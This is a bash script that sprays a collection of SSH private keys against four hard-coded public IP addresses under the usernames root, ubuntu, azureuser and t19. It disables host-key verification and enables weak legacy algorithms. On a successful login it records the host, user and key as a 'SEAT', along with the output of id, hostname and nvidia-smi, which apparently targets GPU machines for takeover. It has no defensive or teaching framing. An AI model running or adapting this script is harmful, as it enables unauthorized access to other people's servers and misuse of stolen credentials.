#!/bin/bash
set +u
B="$HOME/b"; OUT="$B/deep.tsv"; : > "$OUT"
mapfile -t KEYS < <(ls "$B"/keys/k* 2>/dev/null); chmod 600 "${KEYS[@]}" 2>/dev/null
echo "=== DEEP $(date -u +%FT%TZ) egress=$(curl -s -m 6 https://api.ipify.org) keys=${#KEYS[@]}" | tee -a "$OUT"
for H in 70.153.87.133 40.123.206.138 20.205.187.223 20.109.152.114; do
  for U in t19 root ubuntu azureuser; do
    : > "$B/c.txt"
    for k in "${KEYS[@]}"; do echo "$k|$k" >> "$B/c.txt"; done
    cat "$B/c.txt" | xargs -P 5 -I{} bash -c '
      k="${1%%|*}"
      r=$(timeout 20 ssh -F /dev/null -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
          -o ConnectTimeout=10 -o BatchMode=yes -o NumberOfPasswordPrompts=0 -o PreferredAuthentications=publickey \
          -o PubkeyAcceptedAlgorithms=+ssh-rsa,ssh-ed25519 -o HostKeyAlgorithms=+ssh-rsa \
          -o KexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 \
          -i "$k" "$2@$3" "id; hostname -I; nvidia-smi -L" 2>&1)
      if echo "$r" | grep -q "uid="; then echo -e "$3\t$2\tSEAT\t$(basename $k)\t$(date -u +%FT%TZ)\t$(echo "$r"|tr "\n" "|"|cut -c1-300)" >> "$OUT"
      elif echo "$r" | grep -qi "Permission denied"; then echo -e "$3\t$2\tPERMDENY\t$(basename $k)\t$(date -u +%FT%TZ)\t-" >> "$OUT"
      elif echo "$r" | grep -qi "Connection refused"; then echo -e "$3\t$2\tREFUSED\t$(basename $k)\t$(date -u +%FT%TZ)\t-" >> "$OUT"
      else echo -e "$3\t$2\tOTHER\t$(basename $k)\t$(date -u +%FT%TZ)\t$(echo "$r"|head -c 60|tr "\n" " ")" >> "$OUT"; fi
    ' _ {} "$U" "$H" 2>/dev/null
    echo "$H $U done $(date -u +%FT%TZ) perm=$(grep -c "	$U	PERMDENY" "$OUT")" | tee -a "$OUT"
  done
done
echo "=== TOTALS ==="; cut -f3 "$OUT" | sort | uniq -c
echo "=== SEATS ==="; grep -P '\tSEAT\t' "$OUT" | head
